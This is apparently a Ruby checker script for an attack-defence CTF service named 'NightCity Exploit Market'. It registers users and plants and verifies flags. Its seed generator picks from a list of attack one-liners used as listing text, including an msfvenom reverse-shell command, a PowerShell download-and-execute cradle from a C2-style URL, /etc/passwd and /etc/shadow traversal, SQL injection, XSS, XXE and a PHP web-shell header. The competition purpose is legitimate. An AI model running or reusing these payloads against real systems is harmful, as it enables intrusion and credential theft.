#!/usr/bin/ruby
# frozen_string_literal: true

require 'net/http'
require 'securerandom'
require 'uri'
require 'cgi'
require 'sqlite3'
require 'fileutils'

module Checker
  #
  # Статусы чекера (уникальные exit-коды)
  #
  class ExitCode
    def self.ok
      exit(101)  # Service worked
    end

    def self.corrupt
      exit(102)  # Data corrupted
    end

    def self.mumble
      exit(103)  # Logic error
    end

    def self.down
      exit(104)  # Service down
    end
  end

  #
  # Основной класс чекера
  #
  class NightCity
    PORT = 7331
    TIMEOUT_SECONDS = 1

    def initialize(flag:, team_address:, flag_id:)
      @team_address = team_address
      @base_url = "http://#{team_address}:#{PORT}"
      @flag = flag
      @flag_id = flag_id
      @cookie = nil
      @state = StateStorage.new(team_address)
      @user = Seed::User.new
    end

    def make_http(uri)
      Net::HTTP.new(uri.host, uri.port).tap do |http|
        http.open_timeout = TIMEOUT_SECONDS
        http.read_timeout = TIMEOUT_SECONDS
      end
    end

    def check
      verify_service_available
      vuln_id, email, password = @state.find_vuln_id(@flag_id)
      login(email, password)
      validate_flag_in_vulnerability(vuln_id)
      Checker::ExitCode.ok
    rescue StandardError => e
      puts "[EXCEPTION] #{e}"
      Checker::ExitCode.corrupt
    end

    def put
      verify_service_available
      register_and_login
      create_vulnerability if rand < 0.5
      create_vulnerability if rand < 0.5
      vuln_id = create_vulnerability
      @state.save_flag(@flag_id, @user.email, @user.password, vuln_id)
      validate_flag_in_vulnerability(vuln_id)
      Checker::ExitCode.ok
    rescue StandardError => e
      puts "[EXCEPTION] #{e}"
      Checker::ExitCode.corrupt
    end

    private

    #
    # Проверяем, доступен ли сервис (возвращается ли главная страница)
    #
    def verify_service_available
      uri = URI(@base_url)
      response = make_http(uri).get(uri.request_uri)
      unless response.code.to_i == 200 && response.body.include?('NightCity Exploit Market')
        raise 'Service not available or no marker found'
      end
    rescue StandardError => e
      puts "[SERVICE DOWN] #{e}"
      Checker::ExitCode.down
    end

    #
    # Регистрируемся
    #
    def register_and_login
      register_uri = URI("#{@base_url}/users/register")
      response = post_form(register_uri, username: @user.username, email: @user.email, password: @user.password)
      raise 'Registration failed' unless response.code.to_i == 302

      login_uri = URI("#{@base_url}/users/login")
      response_login = post_form(login_uri, email: @user.email, password: @user.password)
      raise 'Login failed' unless response_login.code.to_i == 302

      @cookie = response_login['Set-Cookie']
    end

    #
    # Входим в систему (запоминаем куки)
    #
    def login(email, password)
      login_uri = URI("#{@base_url}/users/login")
      response_login = post_form(login_uri, email: email, password: password)
      raise 'Login failed' unless response_login.code.to_i == 302

      @cookie = response_login['Set-Cookie']
    end

    #
    # Создание уязвимости (с форм-даты)
    #
    def create_vulnerability
      uri = URI("#{@base_url}/vulnerabilities")
      seed_data = Seed::Vulnerability.new(flag: @flag).to_h
      response = post_form(uri, seed_data)
      raise 'Create vulnerability failed' unless response.code.to_i == 302

      location_header = response['location']
      raise 'No location header' unless location_header

      # Пример: "/vulnerabilities/34?flash=..."
      # Достаём ID
      path = CGI.unescape(location_header)
      path.split('?').first.split('/').last.to_i
    end

    #
    # Проверяем наличие флага на странице уязвимости
    #
    def validate_flag_in_vulnerability(vuln_id)
      uri = URI("#{@base_url}/vulnerabilities/#{vuln_id}")
      response = get_request(uri)
      raise "Wrong code #{response.code}" unless response.code.to_i == 200

      raise 'Flag not found in vulnerability' unless response.body.include?(@flag)
    end

    #
    # POST запрос с form-data
    #
    def post_form(uri, data_hash)
      request = Net::HTTP::Post.new(uri)
      request.set_form_data(data_hash)
      request['Cookie'] = @cookie if @cookie

      make_http(uri).start { |http| http.request(request) }
    end

    #
    # GET запрос с кукой
    #
    def get_request(uri)
      request = Net::HTTP::Get.new(uri)
      request['Cookie'] = @cookie if @cookie

      make_http(uri).start { |http| http.request(request) }
    end
  end

  class StateStorage
    DB_FOLDER = 'checker_states'

    def initialize(team_address)
      @team_address = sanitize_name(team_address)
      FileUtils.mkdir_p(DB_FOLDER) unless Dir.exist?(DB_FOLDER)
      @db_path = File.join(DB_FOLDER, "#{@team_address}.db")
      @db = SQLite3::Database.new(@db_path)
      create_team_table
    end

    def save_flag(flag_id, email, password, vuln_id)
      @db.execute(
        'INSERT INTO flags (flag_id, email, password, vuln_id) VALUES (?, ?, ?, ?)',
        [flag_id, email, password, vuln_id]
      )
    end

    def find_vuln_id(flag_id)
      res = @db.get_first_row(
        'SELECT vuln_id, email, password FROM flags WHERE flag_id = ?',
        [flag_id]
      )
      raise 'Flag ID not found in state storage' unless res

      res
    end

    private

    def create_team_table
      @db.execute <<-SQL
        CREATE TABLE IF NOT EXISTS flags (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          flag_id TEXT NOT NULL UNIQUE,
          vuln_id INTEGER NOT NULL,
          email TEXT NOT NULL,
          password TEXT NOT NULL,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
      SQL
    end

    def sanitize_name(name)
      name.gsub(/\W/, '_').downcase
    end
  end
end

module Seed
  class User
    attr_reader :username, :email, :password

    def initialize
      @first_names = first_names.sample
      @last_names = last_names.sample

      @username = generate_username
      @password = generate_password
      @email    = generate_email
    end

    private

    def first_names
      %w[
        James	Michael	Robert	John	David	William	Richard	Joseph	Thomas Christopher
        Charles Daniel Matthew Anthony Mark Donald Steven Andrew Paul Joshua Danielle
        Kenneth Kevin Brian Timothy Ronald George Jason Edward Jeffrey Ryan Marilyn Natalie
        Jacob Nicholas Gary Eric Jonathan Stephen Larry Justin Scott Brandon Beverly
        Aaron Jose Adam Nathan Henry Zachary Douglas Peter Kyle Noah Ethan Jeremy
        Christian Walter Keith Austin Roger Terry Sean Gerald Carl Dylan Harold Jordan Jesse
        Bryan Lawrence Arthur Gabriel Bruce Logan Billy Joe Alan Juan Elijah Willie Albert
        Wayne Randy Mason Vincent Liam Roy Bobby Caleb Bradley Russell Lucas
        Benjamin Samuel Gregory Alexander Patrick Frank Raymond Jack Dennis Jerry Tyler
        Mary Patricia Jennifer Linda Elizabeth Barbara Susan Jessica Karen Sarah Lisa Nancy
        Sandra Betty Ashley Emily Kimberly Margaret Donna Michelle Carol Amanda Melissa Deborah
        Stephanie Rebecca Sharon Laura Cynthia Dorothy Amy Kathleen Angela Shirley Emma Brenda
        Pamela Nicole Anna Samantha Katherine Christine Debra Rachel Carolyn Janet Maria Olivia Heather
        Helen Catherine Diane Julie Victoria Joyce Lauren Kelly Christina Ruth Joan Virginia Judith
        Evelyn Hannah Andrea Megan Cheryl Jacqueline Madison Teresa Abigail Sophia Martha Sara Gloria Janice
        Kathryn Ann Isabella Judy Charlotte Julia Grace Amber Alice Jean Denise Frances
        Diana Brittany Theresa Kayla Alexis Doris Lori Tiffany
      ]
    end

    def last_names
      %w[
        Silver Hackwood Firewall ZeroShade Cross Black Ice Hex Stryker Acid Dream Ghost Flux Overdrive Killbyte Wilson Wood
        Adams Allen Alvarez Anderson Bailey Baker Bennet Brooks Brown Campbell Carter Castillo Chavez Clark Wright Young
        Close Collins Cook Cooper Cox Cruz Flores Foster Garcia Gomez Gonzales Gray Green Gutierrez Hall Harris
        Hernandez Hill Howard Hughes Jackson James Jimenez Johnson Jones Kelly Kim King Korean Lee Lewis Long Lopez
        Martin Martinez Mendoza Miller Mitchell Moore Morales Morgan Morris Murphy Myers Nelson Nguyen Ortiz Parker Patel
        Perez Peterson Phillips Price Ramirez Ramos Rank Reed Reyes Richardson Rivera Roberts Robinson Rodriguez Rogers Ross
        Ruiz Sanchez Sanders Scott Taylor Thomas Thompson Turner Vietnamese View More Walker Ward Watson White Williams
      ]
    end

    def corp_domains
      %w[
        arasaka conag ebm eurobank iec microtech militech
        petrochem segatari sovoil sycust adrekrobotics ahi
        kiroshioptics bakumatsuchipmasters dakaisoundsystems
        kenjiritechnology rocklinaugmentics
      ]
    end

    def personal_domains
      %w[gmail yahoo hotmail]
    end

    def rare_personal_domains
      %w[
        aol msn yahoo live rediffmail ymail outlook
        uol bol bigpond terra rocketmail facebook yahoo
        sky qq me yahoo yahoo mail live
      ]
    end

    def generate_username
      "#{@first_names} #{@last_names}"
    end

    def generate_email
      joiner = ['.', '_', ''].sample
      local = [@first_names.downcase, @last_names.downcase].join(joiner)
      local += joiner + rand(19..69).to_s if rand(10) < 2

      domain = if rand(10) < 5
                 personal_domains.sample
               elsif rand(10) < 3
                 corp_domains.sample
               else
                 rare_personal_domains.sample
               end
      "#{local}@#{domain}.com"
    end

    def generate_password
      SecureRandom.hex(16)
    end
  end

  #
  # Генерация данных для создания уязвимости (Seed)
  #
  class Vulnerability
    def initialize(flag:)
      @flag = flag
      @exploit_type = pick_exploit_type
      @platform     = pick_platform
    end

    def to_h
      {
        title: generate_title,
        description: generate_description,
        exploit: generate_exploit(@flag),
        exploit_type: @exploit_type,
        platform: @platform,
        price: rand(250..600) * 10
      }
    end

    private

    #
    # 1) Генерация заголовка (title)
    #    - Используем несколько массивов с "кусками", а затем комбинируем.
    #
    def generate_title
      adjectives = %w[Dangerous Inexperienced Core Advanced Remote External Good Neon Ghost
                      Stealth Phantom Quantum Dark]
      verbs = %w[Spoofing Rootkit Malware Ransomware Breach Overflow Glitch Injection Crash
                 Escalation Backdoor]
      type_tag = @exploit_type.upcase.gsub('_', '')
      plat = platform_short(@platform)

      "#{adjectives.sample} #{verbs.sample} in #{plat} (#{type_tag})"
    end

    def generate_exploit(flag)
      [
        'msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f vbs --arch x86 --platform win',
        'powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(‘http://www.c2server.co.uk/script.ps1’);',
        'curl "http://example.com/index.php?page=../../etc/passwd"; ',
        'curl "http://example.com/login" -d "user=admin" OR "1"="1&pass=pass"; ',
        'curl "http://example.com/search?q=<script>alert(1)</script>"; ',
        'iconv -f ASCII -t UTF-16LE powershellscript.txt | base64 | tr -d "\n"',
        'curl "http://example.com/download?file=../../../etc/shadow"; ',
        'curl -X POST "http://example.com/reset" -d "email=admin@example.com%0ABcc:attacker@example.com"; ',
        'curl "http://example.com/api?id=1 UNION SELECT username,password FROM users"; ',
        'curl -H "User-Agent: <?php system($_GET[\'cmd\']); ?>" "http://example.com/log"; ',
        'curl "http://example.com/profile?user=1 OR 1=1"; ',
        'curl "http://example.com/?redir=http://evil.com"; ',
        'curl -X POST "http://example.com/xml" -d \'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>\'; ',
        'curl "http://example.com/admin" -H "Cookie: session=../../../etc/passwd"; ',
        'curl -X POST "http://example.com/upload" -F "file=@shell.php"; ',
        'curl "http://example.com/item?id=1; DROP TABLE users"; ',
        'curl -H "X-Forwarded-For: 127.0.0.1" "http://example.com/secure"; ',
        'curl "http://example.com/view?template=../../../../../etc/passwd"'
      ].sample + flag
    end

    def generate_description
      threat = [
        'allows full system compromise',
        'leads to credential leaks',
        'gives remote shell access',
        'lets attacker escalate privileges silently',
        'exposes internal API endpoints'
      ]

      context = [
        "in the #{platform_long(@platform)} stack",
        "through malformed #{@exploit_type.gsub('_', ' ')} payloads",
        'when parsing user input in insecure mode',
        "due to outdated libs on the #{platform_long(@platform)} side",
        "using chained exploits in #{platform_long(@platform)} modules"
      ]

      aftermath = [
        'Patch urgently advised',
        'Critical in RedTeam simulations',
        'Used by major APT groups',
        'Logged in deep net marketplaces',
        'Detected in NightCity blacknet'
      ]

      "#{@exploit_type.capitalize} vulnerability #{context.sample} #{threat.sample}. #{aftermath.sample}."
    end

    def pick_exploit_type
      %w[
        rce sqli xss lfi rfi xxe idor ssti buffer_overflow
        heap_overflow format_string command_injection privilege_escalation
        auth_bypass logic_bug crypto_attack side_channel hardware_exploit
        iot_exploit smart_contract deepfake_hack
      ].sample
    end

    def pick_platform
      %w[
        windows linux macos android ios web
        cloud scada iot blockchain hypervisor
        network firmware game drone automotive
      ].sample
    end

    def platform_long(code)
      {
        'windows' => 'Microsoft Windows',
        'linux' => 'Linux-based systems',
        'macos' => 'Apple macOS',
        'android' => 'Android devices',
        'ios' => 'iOS devices',
        'web' => 'web stack',
        'cloud' => 'cloud platforms (AWS, Azure, GCP)',
        'scada' => 'SCADA/ICS',
        'iot' => 'IoT devices',
        'blockchain' => 'blockchain nodes',
        'hypervisor' => 'hypervisor environments',
        'network' => 'network gear (firewalls, routers)',
        'firmware' => 'firmware layers',
        'game' => 'game engines',
        'drone' => 'drone control systems',
        'automotive' => 'automotive systems'
      }[code] || code
    end

    def platform_short(code)
      {
        'windows' => 'Win',
        'linux' => 'Linux',
        'macos' => 'macOS',
        'android' => 'Android',
        'ios' => 'iOS',
        'web' => 'Web',
        'cloud' => 'Cloud',
        'scada' => 'SCADA',
        'iot' => 'IoT',
        'blockchain' => 'Blockchain',
        'hypervisor' => 'HV',
        'network' => 'Net',
        'firmware' => 'Firmware',
        'game' => 'Game',
        'drone' => 'Drone',
        'automotive' => 'Auto'
      }[code] || code.capitalize
    end
  end
end

#
# Точка входа
#
team_address = ARGV[0] || '127.0.0.1'
command      = ARGV[1] || 'check'
flag_id      = ARGV[2] || rand(100_000..900_000).to_s
flag         = ARGV[3] || SecureRandom.uuid

checker = Checker::NightCity.new(flag: flag, team_address: team_address, flag_id: flag_id)

case command
when 'check'
  checker.check
when 'put'
  checker.put
else
  puts "Usage: #{__FILE__} <team_address> <check|put> [flag_id] [flag]"
  exit(1)
end
